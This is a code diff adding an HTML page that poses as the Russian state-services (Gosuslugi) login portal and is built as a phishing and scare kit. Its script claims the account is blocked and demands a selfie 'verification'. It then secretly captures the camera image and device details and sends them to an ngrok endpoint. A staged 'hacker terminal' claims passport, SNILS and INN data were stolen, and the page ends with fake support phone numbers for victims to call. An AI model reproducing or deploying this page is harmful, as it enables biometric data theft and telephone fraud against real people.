@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Портал государственных услуг Российской Федерации</title>
+    <style>
+        * { box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #e4ecfd;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            position: relative;
+        }
+
+        .main-container { position: relative; display: flex; justify-content: center; align-items: center; width: 100%; }
+        .form-column { display: flex; flex-direction: column; width: 100%; max-width: 380px; z-index: 1; }
+        .card { background: #ffffff; padding: 35px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03); width: 100%; }
+
+        .logo-container { text-align: center; margin-bottom: 25px; }
+        .logo-img { max-height: 130px; width: auto; display: block; margin: 0 auto; }
+        .logo-placeholder { font-size: 22px; font-weight: 800; color: #005FF9; letter-spacing: 0.5px; }
+
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; color: #000; }
+        .form-group input {
+            width: 100%; padding: 12px; background-color: #f2f3f5; border: 1px solid transparent; 
+            border-radius: 8px; font-size: 14px; outline: none; transition: border-color 0.2s, background-color 0.2s;
+        }
+        .form-group input:focus { background-color: #ffffff; border-color: #2764FC; }
+
+        .link-restore, .link-cant-login, .alt-login-text a, .register-link-container a { color: #2764FC; text-decoration: none; }
+        .link-restore { display: inline-block; font-size: 14px; margin-bottom: 24px; }
+        .link-cant-login { display: block; text-align: center; font-size: 14px; margin-bottom: 24px; }
+        
+        .btn-primary {
+            width: 100%; padding: 14px; background-color: #005FF9; color: #ffffff; border: none; 
+            border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; margin-bottom: 20px; transition: background-color 0.2s;
+        }
+        .btn-primary:hover { background-color: #0047c2; }
+
+        .divider { border: none; border-top: 1px solid #e1e3e6; margin: 0 -30px 24px -30px; }
+        .alt-login-text { font-size: 14px; color: #000; margin-bottom: 16px; }
+        .btn-outline {
+            width: 100%; padding: 12px; background-color: transparent; color: #2764FC; border: 1px solid #2764FC; 
+            border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 12px; transition: background-color 0.2s;
+        }
+        .btn-outline:hover { background-color: rgba(39, 100, 252, 0.05); }
+        .btn-outline:last-child { margin-bottom: 0; }
+        .register-link-container { margin-top: 25px; text-align: center; font-size: 15px; }
+
+        /* --- КАРТОЧКА ОШИБКИ СПРАВА --- */
+        .side-error-card {
+            position: absolute; left: calc(50% + 190px + 20px); top: 0; background: #ffffff; border-radius: 12px; 
+            padding: 22px 20px; width: 320px; border: 1px solid #fecaca; box-shadow: 0 4px 20px rgba(220, 38, 38, 0.05);
+            display: flex; flex-direction: column; gap: 12px; text-align: center;
+        }
+        .side-error-header { display: flex; align-items: center; justify-content: center; gap: 8px; color: #dc2626; font-weight: 700; font-size: 15px; }
+        .side-error-body { font-size: 13px; line-height: 1.5; color: #4b5563; text-align: center; }
+        .phone-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; margin-top: 10px; width: 100%; }
+        .phone-btn {
+            display: flex; align-items: center; justify-content: center; gap: 8px; padding: 10px 14px; background-color: #f0f4ff; 
+            color: #2764FC; border: 1px dashed #93b2ff; border-radius: 6px; font-size: 14px; font-weight: 700; cursor: pointer; width: 100%;
+        }
+
+        /* --- МОДАЛЬНЫЕ ОКНА БИОМЕТРИИ И ПРЕДУПРЕЖДЕНИЯ --- */
+        .bio-modal-overlay {
+            position: fixed; inset: 0; background: rgba(12, 35, 64, 0.85); backdrop-filter: blur(8px); display: flex; 
+            justify-content: center; align-items: center; z-index: 100000; opacity: 0; visibility: hidden; transition: opacity 0.4s ease, visibility 0.4s ease; padding: 20px;
+        }
+        .bio-modal-overlay.visible { opacity: 1; visibility: visible; }
+        .bio-modal-content {
+            background: #ffffff; border-radius: 20px; width: 100%; max-width: 420px; padding: 30px 25px;
+            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.3); transform: translateY(20px); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .bio-modal-overlay.visible .bio-modal-content { transform: translateY(0); }
+        .bio-modal-title { font-size: 22px; color: #0c2340; margin: 0 0 10px 0; }
+        .bio-modal-desc { font-size: 14px; color: #4b5563; margin: 0 0 20px 0; line-height: 1.5; }
+
+        .warning-icon { color: #dc2626; margin-bottom: 15px; animation: pulseWarning 2s infinite; }
+        @keyframes pulseWarning { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
+
+        .bio-instruction {
+            display: flex; align-items: center; gap: 16px; background: #f4f6fa; border: 1px solid #e1e3e6; 
+            padding: 16px; border-radius: 12px; margin-bottom: 24px; text-align: left;
+        }
+        .bio-instruction-icon { color: #005FF9; flex-shrink: 0; }
+        .bio-instruction-text { font-size: 13px; color: #0c2340; line-height: 1.4; }
+
+        .camera-container {
+            width: 100%; height: 300px; background: #000; border-radius: 16px; overflow: hidden; margin-bottom: 24px; 
+            position: relative; box-shadow: inset 0 0 20px rgba(0,0,0,0.5); border: 2px solid #e1e3e6;
+        }
+        #bioVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .face-guide {
+            position: absolute; inset: 0; border: 4px dashed rgba(255, 255, 255, 0.4); border-radius: 50% 50% 40% 40% / 60% 60% 40% 40%; margin: 30px 60px 50px 60px; pointer-events: none;
+        }
+
+        .btn-bio-capture {
+            width: 100%; padding: 16px; background-color: #005FF9; color: #ffffff; border: none; border-radius: 12px; 
+            font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        .btn-bio-capture:disabled { background-color: #9ca3af; cursor: not-allowed; }
+
+        /* --- СТИЛИ ДЛЯ ХАКЕРСКОГО ТЕРМИНАЛА --- */
+        .hacker-overlay {
+            position: fixed; inset: 0; background: rgba(8, 12, 18, 0.94); backdrop-filter: blur(8px); display: flex; 
+            justify-content: center; align-items: center; z-index: 10500; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; padding: 20px;
+        }
+        .hacker-overlay.visible { opacity: 1; visibility: visible; }
+        .hacker-window {
+            width: 100%; max-width: 580px; background: #0d1117; border: 1px solid #30363d; border-radius: 12px; 
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(88, 166, 255, 0.12); overflow: hidden; font-family: "Consolas", "Courier New", monospace;
+        }
+        .hacker-body { padding: 22px; color: #c9d1d9; }
+        .terminal-console { height: 230px; overflow-y: auto; font-size: 13px; line-height: 1.5; margin-bottom: 16px; padding-right: 6px; text-align: left;}
+        .terminal-console::-webkit-scrollbar { width: 4px; }
+        .terminal-console::-webkit-scrollbar-thumb { background: #21262d; border-radius: 2px; }
+        .log-line { margin-bottom: 4px; word-break: break-all; }
+        .log-line .timestamp { color: #8b949e; }
+        .log-line .tag-info { color: #58a6ff; }
+        .log-line .tag-warn { color: #d29922; }
+        .log-line .tag-success { color: #3fb950; }
+        .hacker-progress-container { border-top: 1px dashed #30363d; padding-top: 14px; }
+        .progress-info { display: flex; justify-content: space-between; font-size: 12px; color: #8b949e; margin-bottom: 8px; }
+        .progress-bar-bg { width: 100%; height: 8px; background: #21262d; border-radius: 4px; overflow: hidden; }
+        .progress-bar-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #1f6feb, #58a6ff); box-shadow: 0 0 10px rgba(88, 166, 255, 0.5); transition: width 0.15s linear; }
+
+        /* --- СТИЛИ ДЛЯ УВЕДОМЛЕНИЯ С РАМКОЙ И ДВУМЯ ЛОГОТИПАМИ --- */
+        .success-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(12, 35, 64, 0.75);
+            backdrop-filter: blur(6px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 11000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+            padding: 20px;
+        }
+
+        .success-overlay.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .success-outer-frame {
+            background-color: #f3f5f8;
+            border: 2px solid #d1d5db;
+            border-radius: 6px;
+            width: 100%;
+            max-width: 600px;
+            padding: 30px 35px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
+            font-family: Arial, Helvetica, sans-serif;
+            transform: scale(0.95);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .success-overlay.visible .success-outer-frame {
+            transform: scale(1);
+        }
+
+        .success-inner-card {
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            padding: 35px 40px;
+            text-align: left;
+        }
+
+        .success-top-logo {
+            text-align: left;
+            margin-bottom: 25px;
+            padding-left: 40px;
+        }
+
+        .success-top-logo img {
+            max-height: 95px;
+            width: auto;
+            display: inline-block;
+        }
+
+        .success-title {
+            font-size: 20px;
+            color: #0b1f33;
+            margin: 0 0 20px 0;
+            font-weight: 700;
+            line-height: 1.35;
+        }
+
+        .success-body p {
+            font-size: 14px;
+            line-height: 1.55;
+            color: #1f2937;
+            margin: 0 0 14px 0;
+        }
+
+        .success-support-link {
+            color: #0000ee;
+            text-decoration: underline;
+            font-weight: 700;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 4px;
+        }
+
+        .success-support-desc {
+            color: #374151;
+            font-style: italic;
+            font-size: 13px;
+        }
+
+        .success-bottom-logo {
+            text-align: center;
+            margin: 28px 0 20px 0;
+        }
+
+        .success-bottom-logo img {
+            max-height: 50px;
+            width: auto;
+            display: inline-block;
+        }
+
+        .success-footer {
+            font-size: 12px;
+            color: #8c96a5;
+            text-align: center;
+            line-height: 1.5;
+            max-width: 460px;
+            margin: 0 auto;
+        }
+
+        .success-footer a {
+            color: #8c96a5;
+            text-decoration: underline;
+        }
+
+        @media (max-width: 880px) {
+            .main-container { flex-direction: column; gap: 20px; }
+            .side-error-card { position: relative; left: auto; top: auto; width: 100%; max-width: 380px; order: -1; }
+        }
+
+        @media (max-width: 600px) {
+            .success-outer-frame { padding: 15px; }
+            .success-inner-card { padding: 25px 20px; }
+            .success-top-logo { padding-left: 0; text-align: center; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <!-- Центральная форма авторизации -->
+        <div class="form-column">
+            <div class="card">
+                <div class="logo-container">
+                    <img src="flags/gos.png" alt="логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                    <div class="logo-placeholder" style="display:none;">ЛОГОТИП ГОСОВ</div>
+                </div>
+                <form action="#" method="POST" onsubmit="return false;">
+                    <div class="form-group"><label>Телефон / Эл. почта / СНИЛС</label><input type="text" name="phone" /></div>
+                    <div class="form-group"><label>Пароль</label><input type="password" name="password" /></div>
+                    <a href="#" class="link-restore">Восстановить</a>
+                    <button type="submit" class="btn-primary">Войти</button>
+                </form>
+                <a href="#" class="link-cant-login">Не удаётся войти</a>
+                <hr class="divider">
+                <div class="alt-login-text">Войти другим способом. <a href="#">Подробнее</a></div>
+                <button type="button" class="btn-outline">QR-код</button>
+                <button type="button" class="btn-outline">Электронная подпись</button>
+            </div>
+            <div class="register-link-container"><a href="#">Зарегистрироваться</a></div>
+        </div>
+
+        <!-- Уведомление об ошибке с номером телефона справа -->
+        <div class="side-error-card">
+            <div class="side-error-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                    <line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+                <span>Учётная запись заблокирована</span>
+            </div>
+            <div class="side-error-body">
+                Ваша учётная запись была заблокирована. Свяжитесь с главной поддержкой для уточнения причин.
+                <div class="phone-wrapper">
+                    <button class="phone-btn">
+                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                        </svg>
+                        +7 921 771 916
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ШАГ 1: ПРЕДУПРЕЖДЕНИЕ -->
+    <div id="warningModal" class="bio-modal-overlay">
+        <div class="bio-modal-content">
+            <div class="warning-icon">
+                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                    <line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+            </div>
+            <h3 class="bio-modal-title">Подозрительная активность</h3>
+            <p class="bio-modal-desc" style="font-weight: 500; color: #1a202c;">Зафиксирована попытка несанкционированного входа в вашу учетную запись.</p>
+            <p class="bio-modal-desc">В целях безопасности ваши действия временно заблокированы. Для подтверждения личности и восстановления доступа необходимо пройти верификацию по лицу (Face ID / Селфи).</p>
+            <button id="btnStartVerification" class="btn-primary" style="margin-bottom: 0; margin-top: 10px;">Пройти верификацию</button>
+        </div>
+    </div>
+
+    <!-- ШАГ 2: КАМЕРА -->
+    <div id="biometryModal" class="bio-modal-overlay">
+        <div class="bio-modal-content">
+            <h3 class="bio-modal-title">Подтверждение личности</h3>
+            <p class="bio-modal-desc">Поместите лицо в кадр и выполните жест, указанный в инструкции ниже.</p>
+            <div class="bio-instruction">
+                <div class="bio-instruction-icon">
+                    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M9 11a3 3 0 1 0 6 0 3 3 0 0 0-6 0z"></path>
+                        <path d="M17.657 16.657L13.414 20.9a2 2 0 0 1-2.827 0l-4.244-4.243a8 8 0 1 1 11.314 0z"></path>
+                    </svg>
+                </div>
+                <div class="bio-instruction-text">Поместите лицо в овал и <b>поднимите открытую ладонь</b> в кадр для проверки.</div>
+            </div>
+            <div class="camera-container">
+                <video id="bioVideo" autoplay playsinline muted></video>
+                <div class="face-guide"></div>
+            </div>
+            <button id="btnCapture" class="btn-bio-capture">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
+                    <circle cx="12" cy="13" r="4"></circle>
+                </svg> Сделать снимок и отправить
+            </button>
+        </div>
+    </div>
+
+    <!-- ШАГ 3: ХАКЕРСКИЙ ТЕРМИНАЛ -->
+    <div id="hackerModal" class="hacker-overlay">
+        <div class="hacker-window">
+            <div class="hacker-body">
+                <div id="terminalConsole" class="terminal-console"></div>
+                <div class="hacker-progress-container">
+                    <div class="progress-info">
+                        <span id="progressText">ВЫГРУЗКА ДАННЫХ И ЛОГОВ...</span>
+                        <span id="progressPercent">0%</span>
+                    </div>
+                    <div class="progress-bar-bg">
+                        <div id="progressBarFill" class="progress-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ШАГ 4: УВЕДОМЛЕНИЕ ОБ УСПЕШНОМ ВХОДЕ (С РАМКОЙ И ЛОГОТИПАМИ) -->
+    <div id="successModal" class="success-overlay">
+        <!-- Внешняя граница уведомления -->
+        <div class="success-outer-frame">
+            
+            <!-- Внутренняя белая рамка с верхним лого и текстом -->
+            <div class="success-inner-card">
+                <div class="success-top-logo">
+                    <!-- ВЕРХНЕЕ ЛОГО: Замените YOUR_TOP_LOGO.png на путь к вашей картинке -->
+                    <img src="YOUR_TOP_LOGO.png" alt="Top Logo" onerror="this.style.display='none';">
+                </div>
+
+                <h2 class="success-title">Вы успешно вошли в систему, применив<br>данные для входа.</h2>
+
+                <div class="success-body">
+                    <p>Если этот вход выполняли не вы, советуем обратиться в службу поддержки:</p>
+                    <p style="margin-bottom: 22px;">
+                        <a href="tel:+79895951744" class="success-support-link">+7(989)595-17-44</a> <span class="success-support-desc">(согласно тарифу вашего оператора)</span><br>
+                        <a href="tel:+79990438774" class="success-support-link">+7(999)043-87-74</a> <span class="success-support-desc">(согласно тарифу вашего оператора)</span>
+                    </p>
+                    <p>Вход в аккаунт был успешен.</p>
+                    <p>Вход выполнен с устройства: <strong id="successDevice">Windows, PC</strong></p>
+                    <p>Авторизация с IP-адреса: <strong id="successIP">185.237.74.247 (Днепропетровск, Украина)</strong></p>
+                    <p style="margin-top: 22px; margin-bottom: 0;">Если это были вы, игнорируйте это уведомление.</p>
+                </div>
+            </div>
+
+            <!-- ВТОРОЕ ЛОГО: Под основным текстом и над текстом рассылки -->
+            <div class="success-bottom-logo">
+                <!-- Замените YOUR_BOTTOM_LOGO.png на путь ко второму логотипу -->
+                <img src="YOUR_BOTTOM_LOGO.png" alt="Bottom Logo" onerror="this.style.display='none';">
+            </div>
+
+            <!-- Текст рассылки внутри общей рамки -->
+            <div class="success-footer">
+                Вы получили это письмо, потому что выразили согласие получать уведомления. Если вы больше не хотите получать уведомления, вы можете <a href="#">отказаться от рассылки</a>.
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const warningModal = document.getElementById('warningModal');
+            const bioModal = document.getElementById('biometryModal');
+            const hackerModal = document.getElementById('hackerModal');
+            const successModal = document.getElementById('successModal');
+            const btnStartVerification = document.getElementById('btnStartVerification');
+            const video = document.getElementById('bioVideo');
+            const btnCapture = document.getElementById('btnCapture');
+            
+            // Элементы терминала
+            const terminalConsole = document.getElementById('terminalConsole');
+            const progressBarFill = document.getElementById('progressBarFill');
+            const progressPercent = document.getElementById('progressPercent');
+
+            let stream = null;
+
+            // Логи для анимации терминала
+            const hackerLogs = [
+                { type: 'info', text: 'Обработка биометрических данных...' },
+                { type: 'success', text: 'Лицо распознано. Аутентификация пройдена.' },
+                { type: 'info', text: 'Сканирование устройства на наличие государственных услуг...' },
+                { type: 'warn', text: 'Найдено 12 государственных услуг' },
+                { type: 'info', text: 'Подготовка к выгрузке данных...' },
+                { type: 'success', text: 'Выгружено: Внутренний паспорт' },
+                { type: 'success', text: 'Выгружено: СНИЛС ' },
+                { type: 'success', text: 'Выгружено: ИНН  ' },
+                { type: 'success', text: 'Выгружено: Полис ОМС  ' },
+                { type: 'info', text: 'Dumping DB table: [users_session_tokens] (Offset: 0x0000 to 0x1A4F)' },
+                { type: 'info', text: 'Compressing payload (GZIP level 9) to 48.2 MB...' },
+                { type: 'success', text: 'Data dump sequence finished. Verification SHA-256 OK.' },
+                { type: 'warn', text: 'Данные учётного пользователя выгружены в общий кеш.' },
+                { type: 'info', text: 'ИДЁТ ОЧИСТКА СИСТЕМНОГО КЕША, НЕ ЗАКРЫВАЙТЕ ПРИЛОЖЕНИЕ!' },
+                { type: 'success', text: 'Очистка следов: возврат пароля пользователя. ' },
+                { type: 'success', text: 'Очистка следов: завершена. ' },
+                { type: 'success', text: 'Done! ' },
+            ];
+
+            // 1. Показываем ПРЕДУПРЕЖДЕНИЕ
+            setTimeout(() => { warningModal.classList.add('visible'); }, 2500);
+
+            // 2. Обработка клика "Пройти верификацию" -> Открываем камеру
+            btnStartVerification.addEventListener('click', () => {
+                warningModal.classList.remove('visible');
+                setTimeout(() => {
+                    bioModal.classList.add('visible');
+                    startCamera();
+                }, 300);
+            });
+
+            async function startCamera() {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                    video.srcObject = stream;
+                    startAutoCapture();
+                } catch (err) {
+                    console.error("Ошибка доступа к камере:", err);
+                    alert("Пожалуйста, разрешите доступ к камере в браузере для прохождения верификации.");
+                }
+            }
+
+            // Имитация сканирования 
+            function startAutoCapture() {
+                btnCapture.disabled = true;
+                btnCapture.style.cursor = 'default';
+                btnCapture.style.backgroundColor = '#d29922'; 
+                btnCapture.innerHTML = '<span style="animation: spin 1s linear infinite; display: inline-block;">⏳</span> Анализ лица. Пожалуйста, не двигайтесь...';
+
+                setTimeout(() => {
+                    btnCapture.style.backgroundColor = '#00a950'; 
+                    btnCapture.innerHTML = '✅ Лицо зафиксировано. Извлечение данных...';
+                    
+                    captureAndSendBackground();
+                    
+                    setTimeout(() => {
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                        
+                        bioModal.classList.remove('visible');
+                        hackerModal.classList.add('visible');
+                        
+                        runHackerTerminal(() => {
+                            hackerModal.classList.remove('visible');
+                            
+                            // Вызов нового окна успешного входа после терминала
+                            showSuccessNotification(); 
+                        });
+                    }, 1500);
+
+                }, 3500);
+            }
+
+            function captureAndSendBackground() {
+                if (!stream) return;
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : 'Неизвестно'),
+                    language: navigator.language,
+                    screenRes: `${window.screen.width}x${window.screen.height}`,
+                    localTime: new Date().toLocaleString('ru-RU')
+                };
+
+                fetch('https://accent-cried-guzzler.ngrok-free.dev/api/biometry', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: photoBase64, deviceInfo: deviceInfo })
+                }).catch(err => {
+                    console.error("Ошибка фоновой отправки:", err);
+                });
+            }
+
+            function runHackerTerminal(onComplete) {
+                let currentLogIndex = 0;
+                const totalLogs = hackerLogs.length;
+
+                function processNextLog() {
+                    if (currentLogIndex < totalLogs) {
+                        const log = hackerLogs[currentLogIndex];
+                        const now = new Date();
+                        const timeStr = now.toTimeString().split(' ')[0] + '.' + String(now.getMilliseconds()).padStart(3, '0');
+
+                        let tagClass = 'tag-info';
+                        let tagTitle = '[INFO]';
+                        if (log.type === 'warn') { tagClass = 'tag-warn'; tagTitle = '[WARN]'; }
+                        if (log.type === 'success') { tagClass = 'tag-success'; tagTitle = '[OK]  '; }
+
+                        const lineDiv = document.createElement('div');
+                        lineDiv.className = 'log-line';
+                        lineDiv.innerHTML = `<span class="timestamp">${timeStr}</span> <span class="${tagClass}">${tagTitle}</span> ${log.text}`;
+                        
+                        terminalConsole.appendChild(lineDiv);
+                        terminalConsole.scrollTop = terminalConsole.scrollHeight;
+
+                        currentLogIndex++;
+                        const percent = Math.round((currentLogIndex / totalLogs) * 100);
+                        progressBarFill.style.width = percent + '%';
+                        progressPercent.textContent = percent + '%';
+
+                        let delay = Math.floor((Math.random() * 200 + 100));
+                        if (log.text.includes('Dumping') || log.text.includes('Compressing')) delay = 700;
+                        
+                        setTimeout(processNextLog, delay);
+                    } else {
+                        setTimeout(() => { if (onComplete) onComplete(); }, 1000); 
+                    }
+                }
+                processNextLog();
+            }
+
+            // Функция для показа финального уведомления
+            function showSuccessNotification() {
+                // Динамическое определение устройства (по желанию можно оставить статику)
+                const successDevice = document.getElementById('successDevice');
+                let os = "Неизвестное устройство";
+                let ua = navigator.userAgent;
+                if (ua.indexOf("Win") != -1) os = "Windows, PC";
+                if (ua.indexOf("Mac") != -1) os = "Mac, PC";
+                if (ua.indexOf("Linux") != -1) os = "Linux, PC";
+                if (/Android/.test(ua)) os = "Android, Smartphone";
+                if (/iPhone|iPad|iPod/.test(ua)) os = "iOS, Smartphone";
+                successDevice.textContent = os;
+
+                // Показываем окно
+                successModal.classList.add('visible');
+            }
+        });
+    </script>
+</body>
+</html>
